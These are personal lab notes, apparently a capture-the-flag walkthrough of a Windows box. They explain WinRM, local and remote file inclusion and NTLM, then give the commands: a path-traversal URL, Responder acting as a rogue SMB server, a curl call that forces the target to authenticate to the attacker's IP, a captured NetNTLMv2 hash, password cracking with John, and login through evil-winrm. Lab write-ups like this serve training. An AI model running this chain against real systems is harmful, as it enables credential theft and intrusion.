# File Inclusion NTLM


### Notes From box

Nmap scan report for 10.129.31.164
Host is up (0.091s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.89 seconds
----------------------------------------------------------------

We see We have port `80` with `Apache` and port `5985` that is running `Microsoft WinRM`.

#### Windows Remote Management or WinRM

WinRM is a native buil-in remote management protocol that uses Simple Object Protocol to interact with remote computers.
It allows users to 

- Remotely communicate and interfacewith hosts
- Execute commands remotely on systems that are not local to you but are network accessible 
- Monitor, manage and configure server, operating systems and client machines from a remote location. 


### Local File Inclusion (LFI)

LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
intended to be an option for this application. A common example is when an application uses the path to a
file as input. If the application treats this input as trusted, and the required sanitary checks are not
performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name
and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
execution as well.

### Remote File Inclusion

RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote
file on the host using protocols like HTTP, FTP etc.
We test the page parameter to see if we can include files on the target system in the server response. We
will test with some commonly known files that will have the same name across networks, Windows
domains, and systems which can be found here. One of the most common files that a penetration tester
might attempt to access on a Windows machine to verify LFI is the hosts file,
WINDOWS\System32\drivers\etc\hosts (this file aids in the local translation of host names to IP
addresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are
included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\.

```bash
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

The file inclusion was possible because in the backend the `include()` method of php is being used to process the URL parameter page for serving a different webpage for differnt languages. 

More explination on the `include()` method can be found [here](https://www.php.net/manual/en/function.include.php)


### NTLM (New Technology Lan Manager)

NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
authentication protocol used to authenticate a client to a resource on an Active Directory domain.
It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
only once, at login.
The NTLM authentication process is done in the following way :
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
server.
4. The server retrieves the user password (or equivalent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge
string. The value is then compared to the value received from the client. If the values match, the client
is authenticated.

Here is more information about [NTLM](https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager/)

When the NTLM protocol wants to do authentication over the network, it uses a challenge / response
model as described above. A NetNTLMv2 challenge / response is a string specifically formatted to
include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually
a hash. Still, it is regularly referred to as a hash because we attack it in the same manner. You'll see
NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM

### SMB Relay Attack

#SMB_Relay

Reource [here](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/)


## Responder 

#### How does Responder work?
Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB
server. When the target machine attempts to perform the NTLM authentication to that server, Responder
sends a challenge back for the server to encrypt with the user's password. When the server responds,
Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can't
reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same
challenge-response, and if we find one, we know that is the password. This is often referred to as hash
cracking, which we'll do with a program called John The Ripper.


##### Install Responder

```bash
git clone https://github.com/lgandx/Responder
```

#### Use Responder 

```bash
sudo python3 Responder.py -I tun0
```

We will need to run a curl command for responder to catch and send a challenge. 

```bash
curl http://unika.htb/?page=//10.10.14.25/somefile

# Make sure to use tun0 for the ip address
```
We are calling back to our ip address here. 

We should recive a response like this in responder: 

```bash
Administrator::RESPONDER:81ac335b4faf9756:22E69785561029207772C249CECA2BBF:0101000000000000800926A34D64DB01796C6ABDD7EC670A000000000200080053004E004700430001001E00570049004E002D004600350042004D005A005A0031004D0036003300480004003400570049004E002D004600350042004D005A005A0031004D003600330048002E0053004E00470043002E004C004F00430041004C000300140053004E00470043002E004C004F00430041004C000500140053004E00470043002E004C004F00430041004C0007000800800926A34D64DB0106000400020000000800300030000000000000000100000000200000A7EA4F8778CA7F72ACED294A2CABEFE2936692AE28AB04AD61B69D83CCD6B3500A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00340031000000000000000000
```
Then we can use john the riper to get the password.

```Bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt                                                                                                                                                                       hackspark@kali
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2025-01-11 18:13) 100.0g/s 614400p/s 614400c/s 614400C/s 123456..iheartyou
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Now we can see we got the password of `badminton`

Now we can use this witth evil-winrm to get into the box.

```bash
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```


